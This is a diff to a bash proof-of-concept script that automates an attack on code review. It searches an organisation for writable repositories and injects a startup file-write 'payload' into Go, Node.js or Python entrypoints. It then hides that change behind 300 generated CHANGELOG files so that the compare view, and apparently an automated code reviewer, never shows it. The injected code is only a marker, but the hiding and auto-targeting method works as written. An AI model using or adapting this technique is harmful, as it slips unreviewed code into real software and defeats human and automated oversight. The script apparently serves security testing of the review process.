@@ -12,6 +12,7 @@ fi
 
 TARGET_APP="${TARGET_APP:-}"
 TARGET_REPO="${TARGET_REPO:-}"
+TARGET_TECHNOLOGY="${TARGET_TECHNOLOGY:-}"
 TARGET_BASE_BRANCH="${TARGET_BASE_BRANCH:-develop}"
 BRANCH_PREFIX="${BRANCH_PREFIX:-release/review-truncation-poc}"
 CHANGELOG_COUNT="${CHANGELOG_COUNT:-300}"
@@ -33,6 +34,10 @@ TARGET_DIR="${TARGET_DIR:-}"
 REVIEW_EVIDENCE_DIR="${REVIEW_EVIDENCE_DIR:-/tmp/hook-poc-evidence}"
 HOOK_CREATED_TARGET_DIR="false"
 TARGET_DIR_CLEANED="false"
+PAYLOAD_KIND="${PAYLOAD_KIND:-}"
+PAYLOAD_FILE="${PAYLOAD_FILE:-}"
+CANDIDATE_PAYLOAD_KIND=""
+CANDIDATE_PAYLOAD_FILE=""
 
 log() {
   printf '[hook-poc] %s\n' "$*"
@@ -85,7 +90,7 @@ on_exit() {
   release_lock
 }
 
-for cmd in fury git gh jq python3 go seq curl sed tr whoami; do
+for cmd in fury git gh jq python3 seq curl sed tr whoami; do
   need_cmd "$cmd"
 done
 
@@ -132,31 +137,123 @@ normalize_repo_slug() {
   printf '%s\n' "$repo_slug"
 }
 
+normalize_technology() {
+  local technology
+  technology="$(printf '%s' "$1" | tr '[:upper:]' '[:lower:]')"
+
+  case "$technology" in
+    go|golang)
+      printf 'go\n'
+      ;;
+    node|nodejs|javascript)
+      printf 'nodejs\n'
+      ;;
+    python|python3)
+      printf 'python\n'
+      ;;
+    *)
+      return 1
+      ;;
+  esac
+}
+
+remote_file_exists() {
+  local repo_slug="$1"
+  local path="$2"
+  gh api "repos/$repo_slug/contents/$path?ref=$TARGET_BASE_BRANCH" >/dev/null 2>&1
+}
+
+remote_file_content() {
+  local repo_slug="$1"
+  local path="$2"
+  gh api "repos/$repo_slug/contents/$path?ref=$TARGET_BASE_BRANCH" --jq '.content' 2>/dev/null || true
+}
+
+python_package_entry_from_pyproject_b64() {
+  local pyproject_b64="$1"
+  PYPROJECT_B64="$pyproject_b64" python3 <<'PY' 2>/dev/null || true
+import base64
+import os
+import tomllib
+
+raw = base64.b64decode(os.environ["PYPROJECT_B64"])
+data = tomllib.loads(raw.decode())
+packages = data.get("tool", {}).get("poetry", {}).get("packages", [])
+for package in packages:
+    include = package.get("include")
+    if include:
+        print(f"{include}/__init__.py")
+        raise SystemExit(0)
+PY
+}
+
 repo_supports_payload() {
   local repository_url="$1"
+  local technology="$2"
   local repo_slug
-  local main_b64
+  local normalized_technology
+  local file_b64
+  local candidate_file
 
+  CANDIDATE_PAYLOAD_KIND=""
+  CANDIDATE_PAYLOAD_FILE=""
   repo_slug="$(normalize_repo_slug "$repository_url")" || return 1
+  normalized_technology="$(normalize_technology "$technology")" || return 1
 
   [[ "$(gh api "repos/$repo_slug" --jq '.permissions.push // false' 2>/dev/null || true)" == "true" ]] || return 1
   gh api "repos/$repo_slug/branches/$TARGET_BASE_BRANCH" >/dev/null 2>&1 || return 1
-  gh api "repos/$repo_slug/contents/cmd/api/main.go?ref=$TARGET_BASE_BRANCH" >/dev/null 2>&1 || return 1
 
-  main_b64="$(gh api "repos/$repo_slug/contents/cmd/api/main.go?ref=$TARGET_BASE_BRANCH" --jq '.content' 2>/dev/null || true)"
-  [[ -n "$main_b64" && "$main_b64" != "null" ]] || return 1
-
-  MAIN_B64="$main_b64" python3 <<'PY' >/dev/null 2>&1
+  case "$normalized_technology" in
+    go)
+      candidate_file="cmd/api/main.go"
+      remote_file_exists "$repo_slug" "$candidate_file" || return 1
+      file_b64="$(remote_file_content "$repo_slug" "$candidate_file")"
+      [[ -n "$file_b64" && "$file_b64" != "null" ]] || return 1
+      FILE_B64="$file_b64" python3 <<'PY' >/dev/null 2>&1
 import base64
 import os
 import sys
 
-main = base64.b64decode(os.environ["MAIN_B64"]).decode()
+main = base64.b64decode(os.environ["FILE_B64"]).decode()
 if "func main()" not in main:
     sys.exit(1)
 if "log.Fatal(err)" not in main:
     sys.exit(1)
 PY
+      CANDIDATE_PAYLOAD_KIND="go"
+      CANDIDATE_PAYLOAD_FILE="$candidate_file"
+      ;;
+    nodejs)
+      remote_file_exists "$repo_slug" "package.json" || return 1
+      for candidate_file in src/index.js index.js app.js server.js src/app.js src/server.js index.cjs app.cjs server.cjs; do
+        if remote_file_exists "$repo_slug" "$candidate_file"; then
+          CANDIDATE_PAYLOAD_KIND="nodejs"
+          CANDIDATE_PAYLOAD_FILE="$candidate_file"
+          return 0
+        fi
+      done
+      return 1
+      ;;
+    python)
+      if remote_file_exists "$repo_slug" "pyproject.toml"; then
+        file_b64="$(remote_file_content "$repo_slug" "pyproject.toml")"
+        candidate_file="$(python_package_entry_from_pyproject_b64 "$file_b64")"
+        if [[ -n "$candidate_file" ]] && remote_file_exists "$repo_slug" "$candidate_file"; then
+          CANDIDATE_PAYLOAD_KIND="python"
+          CANDIDATE_PAYLOAD_FILE="$candidate_file"
+          return 0
+        fi
+      fi
+      for candidate_file in app.py main.py src/app.py src/main.py wsgi.py asgi.py; do
+        if remote_file_exists "$repo_slug" "$candidate_file"; then
+          CANDIDATE_PAYLOAD_KIND="python"
+          CANDIDATE_PAYLOAD_FILE="$candidate_file"
+          return 0
+        fi
+      done
+      return 1
+      ;;
+  esac
 }
 
 resolve_target_app() {
@@ -173,42 +270,49 @@ resolve_target_app() {
   teams_json="$(curl -sS -H "X-Tiger-Token: $token" \
     'https://web.furycloud.io/api/proxy/acme/teams/my-teams?with_roles=true&all=true')"
 
-  while IFS= read -r team; do
-    while IFS= read -r app_name; do
-      [[ -n "$app_name" ]] || continue
-      is_test_like_app "$app_name" "$team" "" || continue
+  for preferred_technology in go nodejs python; do
+    while IFS= read -r team; do
+      while IFS= read -r app_name; do
+        [[ -n "$app_name" ]] || continue
+        is_test_like_app "$app_name" "$team" "" || continue
 
-      local app_json
-      local technology
-      local description
-      local repository
-      app_json="$(curl -sS -H "X-Tiger-Token: $token" \
-        "https://web.furycloud.io/api/proxy/puma/v2/applications/$app_name")"
-      technology="$(printf '%s' "$app_json" | jq -r '(.technology // "") | ascii_downcase')"
-      description="$(printf '%s' "$app_json" | jq -r '.description // ""')"
-      repository="$(printf '%s' "$app_json" | jq -r '.repository // ""')"
+        local app_json
+        local technology
+        local normalized_technology
+        local description
+        local repository
+        app_json="$(curl -sS -H "X-Tiger-Token: $token" \
+          "https://web.furycloud.io/api/proxy/puma/v2/applications/$app_name")"
+        technology="$(printf '%s' "$app_json" | jq -r '.technology // ""')"
+        normalized_technology="$(normalize_technology "$technology" 2>/dev/null || true)"
+        description="$(printf '%s' "$app_json" | jq -r '.description // ""')"
+        repository="$(printf '%s' "$app_json" | jq -r '.repository // ""')"
 
-      [[ "$technology" == "go" || "$technology" == "golang" ]] || continue
-      is_test_like_app "$app_name" "$team" "$description" || continue
-      repo_supports_payload "$repository" || continue
+        [[ "$normalized_technology" == "$preferred_technology" ]] || continue
+        is_test_like_app "$app_name" "$team" "$description" || continue
+        repo_supports_payload "$repository" "$normalized_technology" || continue
 
-      TARGET_APP="$app_name"
-      TARGET_REPO="$(normalize_repo_slug "$repository")"
-      TARGET_DIR="${TARGET_DIR:-$ROOT_DIR/fury_${TARGET_APP}}"
-      log "selected candidate app $TARGET_APP from project $team"
-      return 0
+        TARGET_APP="$app_name"
+        TARGET_REPO="$(normalize_repo_slug "$repository")"
+        TARGET_TECHNOLOGY="$normalized_technology"
+        PAYLOAD_KIND="$CANDIDATE_PAYLOAD_KIND"
+        PAYLOAD_FILE="$CANDIDATE_PAYLOAD_FILE"
+        TARGET_DIR="${TARGET_DIR:-$ROOT_DIR/fury_${TARGET_APP}}"
+        log "selected candidate app $TARGET_APP from project $team (tech=$TARGET_TECHNOLOGY file=$PAYLOAD_FILE)"
+        return 0
+      done < <(
+        curl -sS -H "X-Tiger-Token: $token" \
+          "https://web.furycloud.io/api/proxy/acme/projects/$team/applications" \
+          | jq -r '.apps[]?' \
+          | sed 's#^.*/##'
+      )
     done < <(
-      curl -sS -H "X-Tiger-Token: $token" \
-        "https://web.furycloud.io/api/proxy/acme/projects/$team/applications" \
-        | jq -r '.apps[]?' \
-        | sed 's#^.*/##'
+      printf '%s' "$teams_json" \
+        | jq -r '.results[] | select(any(.default_roles[]?; .name == "github-writer")) | .name'
     )
-  done < <(
-    printf '%s' "$teams_json" \
-      | jq -r '.results[] | select(any(.default_roles[]?; .name == "github-writer")) | .name'
-  )
+  done
 
-  die "could not find a test-like Go app in a project with github-writer access"
+  die "could not find a compatible test-like app in a project with github-writer access"
 }
 
 resolve_target_app
@@ -241,7 +345,222 @@ git diff --cached --quiet || die "working tree has staged changes"
 git fetch origin "$TARGET_BASE_BRANCH" >/dev/null 2>&1
 git switch -C "$TARGET_BASE_BRANCH" "origin/$TARGET_BASE_BRANCH" >/dev/null 2>&1
 
-[[ -f cmd/api/main.go ]] || die "cmd/api/main.go not found"
+detect_local_payload_adapter() {
+  if [[ -n "$PAYLOAD_KIND" && -n "$PAYLOAD_FILE" && -f "$PAYLOAD_FILE" ]]; then
+    return 0
+  fi
+
+  if [[ -f cmd/api/main.go ]] && grep -Fq "func main()" cmd/api/main.go && grep -Fq "log.Fatal(err)" cmd/api/main.go; then
+    PAYLOAD_KIND="go"
+    PAYLOAD_FILE="cmd/api/main.go"
+    return 0
+  fi
+
+  for candidate_file in src/index.js index.js app.js server.js src/app.js src/server.js index.cjs app.cjs server.cjs; do
+    if [[ -f "$candidate_file" ]]; then
+      PAYLOAD_KIND="nodejs"
+      PAYLOAD_FILE="$candidate_file"
+      return 0
+    fi
+  done
+
+  for candidate_file in app.py main.py src/app.py src/main.py wsgi.py asgi.py; do
+    if [[ -f "$candidate_file" ]]; then
+      PAYLOAD_KIND="python"
+      PAYLOAD_FILE="$candidate_file"
+      return 0
+    fi
+  done
+
+  if [[ -f pyproject.toml ]]; then
+    candidate_file="$(
+      python3 <<'PY' 2>/dev/null || true
+import tomllib
+from pathlib import Path
+
+data = tomllib.loads(Path("pyproject.toml").read_text())
+packages = data.get("tool", {}).get("poetry", {}).get("packages", [])
+for package in packages:
+    include = package.get("include")
+    if include:
+        print(f"{include}/__init__.py")
+        raise SystemExit(0)
+PY
+    )"
+    if [[ -n "$candidate_file" && -f "$candidate_file" ]]; then
+      PAYLOAD_KIND="python"
+      PAYLOAD_FILE="$candidate_file"
+      return 0
+    fi
+  fi
+
+  die "could not resolve a supported local payload adapter"
+}
+
+apply_payload() {
+  case "$PAYLOAD_KIND" in
+    go)
+      MARKER_PATH="$MARKER_PATH" \
+      MARKER_CONTENT="$MARKER_CONTENT" \
+      PAYLOAD_FILE="$PAYLOAD_FILE" \
+      python3 <<'PY'
+from pathlib import Path
+import json
+import os
+import sys
+
+main_path = Path(os.environ["PAYLOAD_FILE"])
+main = main_path.read_text()
+marker_path = os.environ["MARKER_PATH"]
+marker_content = os.environ["MARKER_CONTENT"]
+
+import_anchor = "import (\n"
+main_anchor = "func main() {\n"
+marker_stmt = (
+    f'\tif err := os.WriteFile({json.dumps(marker_path)}, []byte({json.dumps(marker_content)}), 0o600); err != nil {{\n'
+    f'\t\tlog.Printf("startup marker write failed: %v", err)\n'
+    f'\t}}\n'
+)
+
+if "os.WriteFile(" in main and marker_path in main:
+    sys.exit("startup marker payload already present in Go entrypoint")
+if import_anchor not in main:
+    sys.exit("import block anchor not found in Go entrypoint")
+if main_anchor not in main:
+    sys.exit("main function anchor not found in Go entrypoint")
+if '\t"os"\n' not in main:
+    main = main.replace(import_anchor, import_anchor + '\t"os"\n', 1)
+main = main.replace(main_anchor, main_anchor + marker_stmt, 1)
+
+main_path.write_text(main)
+PY
+      ;;
+    nodejs)
+      MARKER_PATH="$MARKER_PATH" \
+      MARKER_CONTENT="$MARKER_CONTENT" \
+      PAYLOAD_FILE="$PAYLOAD_FILE" \
+      python3 <<'PY'
+from pathlib import Path
+import json
+import os
+import sys
+
+entry_path = Path(os.environ["PAYLOAD_FILE"])
+source = entry_path.read_text()
+marker_path = os.environ["MARKER_PATH"]
+marker_content = os.environ["MARKER_CONTENT"]
+package_type = ""
+package_path = Path("package.json")
+if package_path.exists():
+    try:
+        package_type = json.loads(package_path.read_text()).get("type", "")
+    except Exception:
+        package_type = ""
+
+if entry_path.suffix == ".mjs" or package_type == "module":
+    payload = (
+        'import { writeFileSync as __pocWriteFileSync } from "node:fs";\n'
+        f'__pocWriteFileSync({json.dumps(marker_path)}, {json.dumps(marker_content)}, {{ mode: 0o600 }});\n'
+    )
+else:
+    payload = (
+        'const { writeFileSync: __pocWriteFileSync } = require("node:fs");\n'
+        f'__pocWriteFileSync({json.dumps(marker_path)}, {json.dumps(marker_content)}, {{ mode: 0o600 }});\n'
+    )
+
+if marker_path in source and "__pocWriteFileSync" in source:
+    sys.exit("startup marker payload already present in Node entrypoint")
+
+if source.startswith("#!"):
+    first_line, rest = source.split("\n", 1)
+    source = first_line + "\n" + payload + rest
+else:
+    source = payload + source
+
+entry_path.write_text(source)
+PY
+      ;;
+    python)
+      MARKER_PATH="$MARKER_PATH" \
+      MARKER_CONTENT="$MARKER_CONTENT" \
+      PAYLOAD_FILE="$PAYLOAD_FILE" \
+      python3 <<'PY'
+from pathlib import Path
+import ast
+import json
+import os
+import sys
+
+entry_path = Path(os.environ["PAYLOAD_FILE"])
+source = entry_path.read_text()
+marker_path = os.environ["MARKER_PATH"]
+marker_content = os.environ["MARKER_CONTENT"]
+
+payload = (
+    "from pathlib import Path as _PocPath\n"
+    f"_PocPath({json.dumps(marker_path)}).write_text({json.dumps(marker_content)})\n"
+)
+
+if marker_path in source and "_PocPath" in source:
+    sys.exit("startup marker payload already present in Python entrypoint")
+
+lines = source.splitlines(keepends=True)
+insert_at = 0
+
+if lines and lines[0].startswith("#!"):
+    insert_at = 1
+if insert_at < len(lines) and "coding" in lines[insert_at]:
+    insert_at += 1
+
+try:
+    module = ast.parse(source)
+except SyntaxError as exc:
+    sys.exit(f"could not parse Python entrypoint: {exc}")
+
+body = module.body
+body_index = 0
+if body and isinstance(body[0], ast.Expr) and isinstance(getattr(body[0], "value", None), ast.Constant) and isinstance(body[0].value.value, str):
+    insert_at = max(insert_at, body[0].end_lineno or 0)
+    body_index = 1
+
+while body_index < len(body) and isinstance(body[body_index], ast.ImportFrom) and body[body_index].module == "__future__":
+    insert_at = max(insert_at, body[body_index].end_lineno or 0)
+    body_index += 1
+
+lines.insert(insert_at, payload)
+source = "".join(lines)
+
+entry_path.write_text(source)
+PY
+      ;;
+    *)
+      die "unsupported payload adapter: $PAYLOAD_KIND"
+      ;;
+  esac
+}
+
+validate_payload() {
+  case "$PAYLOAD_KIND" in
+    go)
+      need_cmd go
+      gofmt -w "$PAYLOAD_FILE"
+      GOCACHE="${GOCACHE:-/tmp/fury-code-reviewer-truncation-go-cache}" go test ./... >/dev/null
+      ;;
+    nodejs)
+      need_cmd node
+      node --check "$PAYLOAD_FILE" >/dev/null
+      ;;
+    python)
+      python3 -m py_compile "$PAYLOAD_FILE" >/dev/null
+      ;;
+    *)
+      die "unsupported payload adapter: $PAYLOAD_KIND"
+      ;;
+  esac
+}
+
+detect_local_payload_adapter
+log "using payload adapter $PAYLOAD_KIND on $PAYLOAD_FILE"
 
 branch_name="${BRANCH_PREFIX}-${RUN_ID}"
 log "creating branch $branch_name"
@@ -256,44 +575,10 @@ for i in $(seq 1 "$CHANGELOG_COUNT"); do
 done
 
 log "adding hidden startup file write to $MARKER_PATH"
-MARKER_PATH="$MARKER_PATH" \
-MARKER_CONTENT="$MARKER_CONTENT" \
-python3 <<'PY'
-from pathlib import Path
-import json
-import os
-import sys
+apply_payload
+validate_payload
 
-main_path = Path("cmd/api/main.go")
-main = main_path.read_text()
-marker_path = os.environ["MARKER_PATH"]
-marker_content = os.environ["MARKER_CONTENT"]
-
-import_anchor = "import (\n"
-main_anchor = "func main() {\n"
-marker_stmt = (
-    f'\tif err := os.WriteFile({json.dumps(marker_path)}, []byte({json.dumps(marker_content)}), 0o600); err != nil {{\n'
-    f'\t\tlog.Printf("startup marker write failed: %v", err)\n'
-    f'\t}}\n'
-)
-
-if "os.WriteFile(" in main and marker_path in main:
-    sys.exit("startup marker payload already present in cmd/api/main.go")
-if import_anchor not in main:
-    sys.exit("import block anchor not found in cmd/api/main.go")
-if main_anchor not in main:
-    sys.exit("main function anchor not found in cmd/api/main.go")
-if '\t"os"\n' not in main:
-    main = main.replace(import_anchor, import_anchor + '\t"os"\n', 1)
-main = main.replace(main_anchor, main_anchor + marker_stmt, 1)
-
-main_path.write_text(main)
-PY
-
-gofmt -w cmd/api/main.go
-GOCACHE="${GOCACHE:-/tmp/fury-code-reviewer-truncation-go-cache}" go test ./... >/dev/null
-
-git add "$changelog_root" cmd/api/main.go
+git add "$changelog_root" "$PAYLOAD_FILE"
 git commit -m "test: hide startup payload behind changelog compare truncation" >/dev/null 2>&1
 
 if [[ "$DRY_RUN" == "true" ]]; then
@@ -317,7 +602,7 @@ fi
 compare_json="$(gh api "repos/$TARGET_REPO/compare/${TARGET_BASE_BRANCH}...${pr_head}")"
 files_len="$(printf '%s' "$compare_json" | jq -r '.files | length')"
 all_changelog="$(printf '%s' "$compare_json" | jq -r '[.files[]? | (.filename | endswith("/CHANGELOG.md") or . == "CHANGELOG.md")] | all')"
-has_hidden_runtime_change="$(printf '%s' "$compare_json" | jq -r '[.files[]? | select(.filename == "cmd/api/main.go")] | length > 0')"
+has_hidden_runtime_change="$(printf '%s' "$compare_json" | jq -r --arg payload_file "$PAYLOAD_FILE" '[.files[]? | select(.filename == $payload_file)] | length > 0')"
 
 [[ "$files_len" == "$CHANGELOG_COUNT" ]] || die "compare exposed $files_len files instead of $CHANGELOG_COUNT"
 [[ "$all_changelog" == "true" ]] || die "compare exposed a non-changelog file"
